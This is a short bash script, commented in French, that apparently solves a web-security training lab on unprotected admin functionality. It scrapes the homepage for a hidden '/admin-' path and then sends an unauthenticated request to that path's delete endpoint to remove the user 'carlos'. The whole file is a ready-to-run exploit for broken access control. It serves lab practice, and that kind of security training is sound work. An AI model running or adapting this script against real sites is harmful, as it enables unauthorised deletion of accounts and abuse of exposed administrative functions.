#!/bin/bash

# Usage: ./unprotected_admin_unpredictable.sh <LAB_URL>
if [ $# -ne 1 ]; then
    echo "Usage: $0 <LAB_URL>"
    exit 1
fi

LAB_URL="$1"

echo "[*] Analyse de la page d'accueil pour trouver l'URL admin..."
homepage=$(curl -sk "$LAB_URL")

# Extraction de l'URL admin à partir d'un script JS ou d'un lien (ex: /admin-xxxxxx)
admin_path=$(echo "$homepage" | grep -Eo "/admin-[a-zA-Z0-9]+" | head -n1)

if [ -z "$admin_path" ]; then
    echo "[-] Impossible de trouver le chemin admin dans la page d'accueil."
    exit 1
fi

echo "[+] Chemin admin trouvé : $admin_path"

# Construction directe du lien de suppression (même si non affiché dans le HTML)
delete_url="$LAB_URL$admin_path/delete?username=carlos"
echo "[*] Tentative de suppression de l'utilisateur carlos via : $delete_url"
curl -sk "$delete_url" -o /dev/null

echo "[+] Requête envoyée. Vérifiez l'interface du lab pour la validation."
